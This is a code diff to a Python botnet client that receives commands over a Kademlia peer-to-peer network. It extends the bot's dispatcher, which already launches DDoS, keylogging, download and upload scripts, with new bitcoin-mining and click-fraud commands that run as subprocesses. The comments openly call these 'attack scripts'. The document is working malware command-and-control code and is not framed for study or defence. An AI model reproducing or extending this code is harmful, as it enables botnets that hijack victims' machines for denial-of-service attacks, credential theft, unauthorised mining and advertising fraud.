@@ -4,7 +4,7 @@ from kademlia.network import Server
 from collections import Counter
 import subprocess, time, sys, hashlib, time
 #these imports below are our own scripts that are run as commands
-import keylogger,ddos
+import keylogger,ddos, mine, clickFraud
 
 # I'm using a kademlia DHT protocol. I built most of this on top of Brian Muller's kademlia python implementation which
 # he so graciously provided free of charge. https://github.com/bmuller/kademlia I chose kademlia over chord because it has some advantages in both simplicity
@@ -36,7 +36,7 @@ class botnode:
 		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging). Might need to do something with them later
 		self.pgroup = []
 		#don't want to have multiple instances of the same program runnings to I'm using a dict to track them
-		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False,'UPLOAD':False}
+		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False,'UPLOAD':False, 'BITCOIN':False, 'CLICKFRAUD':False}
 		#cmdkey is the hash of the nodes bot id
 		self.cmdkey = idhash
 
@@ -54,7 +54,7 @@ def most_common(list):
 
 #End of deferred chain to execute commands once they've been received
 def get_cmd(value,server,bot):
-	commands = ['DDOS','DOWNLOAD','KEYLOG','UPLOAD']
+	commands = ['DDOS','DOWNLOAD','KEYLOG','UPLOAD', 'BITCOIN','CLICKFRAUD']
 	try:
 		x = value.split()
 		cnt = int(x[0]) #parse out the command count
@@ -84,6 +84,14 @@ def get_cmd(value,server,bot):
 				#if bot.cmdsrun['DOWNLOAD'] is False:
 				tmp = 'python download.py {0}'.format(' '.join(x[1:]))
 				print "Starting DOWNLOAD on {0}".format(tmp)
+				process=subprocess.Popen(tmp.split(),shell=False)
+			if cmd == 'BITCOIN':
+				tmp = 'python mine.py {0}'.format(' '.join(x[1:]))
+				print "Starting BITCOING MINING on {0}".format(tmp)
+				process=subprocess.Popen(tmp.split(),shell=False)
+			if cmd == 'CLICKFRAUD':
+				tmp = 'python clickFraud.py {0}'.format(' '.join(x[1:]))
+				print "Starting CLICKFRAUD on {0}".format(tmp)
 				process=subprocess.Popen(tmp.split(),shell=False)
 
 					#bot.cmdsrun['DOWNLOAD'] = True
